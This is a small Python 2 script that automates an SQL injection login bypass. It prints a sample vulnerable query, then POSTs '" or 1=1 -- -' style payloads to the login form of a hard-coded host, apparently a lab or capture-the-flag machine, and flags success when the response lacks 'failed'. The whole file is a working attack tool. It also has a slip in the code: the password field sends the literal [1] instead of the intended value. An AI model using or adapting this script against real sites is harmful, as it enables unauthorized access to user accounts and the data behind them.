#!/bin/python

import requests
import re

class SQL(object):
    def __init__(self):
        self.rhost="10.10.10.86:80"
        self.rpath="/login"
        self.url = "http://{}{}".format(self.rhost, self.rpath)
        self.name_usr = "username" #input name
        self.name_pw =  "password" #input name

        print "[+] Injecting to {}".format(self.url)

    def template(self):

        print """[+] Template #1:\n\n\tuName = getRequestString("username");
\tuPass = getRequestString("userpassword");

\tsql = 'SELECT * FROM Users WHERE Name ="' + uName + '" AND Pass ="' + uPass + '"'
"""


    def injection(self):
        return {0: ['" or 1=1 -- -"', "myPassword"],
                1: ['" OR 1=1 -- -"', "myPassword"]}
        


if __name__ == '__main__':
    sql = SQL()
    sql.template()
    url = sql.url
    usr = sql.name_usr 
    pw = sql.name_pw

    print "[+] Show Injections:\n"
    for k, val in sql.injection().iteritems():
        print "\t[{}] username: {} password: {}".format(k, val[0], val[1])
        r = requests.post(url, data = {usr: val[0], pw: [1]})
        if not (re.search("failed", r.content)):
            print "found"
